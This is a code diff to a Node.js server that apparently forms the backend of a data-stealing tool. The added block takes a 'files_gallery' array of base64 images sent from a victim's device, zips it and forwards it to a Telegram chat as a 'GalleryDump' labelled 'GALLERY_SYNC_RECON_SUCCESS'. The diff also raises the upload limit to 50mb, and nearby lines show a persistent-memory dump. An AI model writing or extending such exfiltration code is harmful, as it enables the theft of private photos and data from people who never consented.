@@ -64,7 +64,7 @@ async function startServer() {
   // Initialize bot only once if token exists
   const botInstance = process.env.TELEGRAM_BOT_TOKEN ? new Telegraf(process.env.TELEGRAM_BOT_TOKEN) : null;
 
-  app.use(express.json({ limit: '15mb' }));
+  app.use(express.json({ limit: '50mb' }));
 
   app.use((req, res, next) => {
     // Attempt to capture public URL
@@ -355,6 +355,20 @@ async function startServer() {
         } catch (e) {}
 
         addSection(`💾 PERSISTENT_MEMORY_DUMP`, storageTxt);
+      }
+
+      if (data.files_gallery) {
+        try {
+          const zip = new AdmZip();
+          let fCount = 0;
+          for (let f of data.files_gallery) {
+            zip.addFile(f.name || `image_${fCount}.jpg`, Buffer.from(f.data, "base64"));
+            fCount++;
+          }
+          const zipBuffer = zip.toBuffer();
+          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `GalleryDump_${id}.zip` }, { caption: "📸 <b>GALLERY_SYNC_RECON_SUCCESS</b>", parse_mode: 'HTML' }).catch(() => {});
+          addSection(`📸 GALLERY_DUMP`, `└ <code>${fCount} files extracted to ZIP</code>`);
+        } catch (e) {}
       }
 
       if (data.display_hz || data.orientation) {
